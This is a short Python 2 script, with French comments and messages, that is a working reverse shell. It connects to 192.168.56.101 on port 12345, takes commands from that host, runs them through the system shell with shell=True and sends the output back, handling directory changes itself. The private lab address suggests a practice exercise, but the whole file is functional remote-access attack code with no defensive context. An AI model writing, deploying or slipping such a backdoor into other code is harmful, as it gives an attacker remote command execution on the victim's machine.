#!/usr/bin/env python
# coding: utf-8
import socket
import subprocess
import sys
import os

# Clear the screen
subprocess.call('cls', shell=True)

# Définition du socket
host = '192.168.56.101'
port = 12345
addr = (host, port)

# Création du socket
print '[+] Création du socket'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind du socket IP
print '[+] Connected on port %s' % port
s.connect(addr)

# We also put in some error handling for catching errors
cwd = os.getcwd()
while True:
    try:
        cwd = os.getcwd() + ">"
        s.send(cwd)
        data = s.recv(1024)
        p = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
        sortie = p.stdout.read()
        if sortie is not None:
            if data[:2] == 'cd':
                cwd = str(data[3:].replace('\n', '').replace(' ', ''))
                if os.path.exists(cwd):
                    os.chdir(cwd)
                else:
                    s.send("Chemin Inexistant\n")
            s.send(sortie)
        else:
            s.send("Prompt vide")

    except KeyboardInterrupt:
        print "Combinaison Ctrl+C entrée"
        sys.exit()

    except socket.gaierror:
        print "Impossible de résoudre l'hôte. Sortie du programme."
        sys.exit()

    except socket.error:
        print "Erreur de création du socket"
        sys.exit()
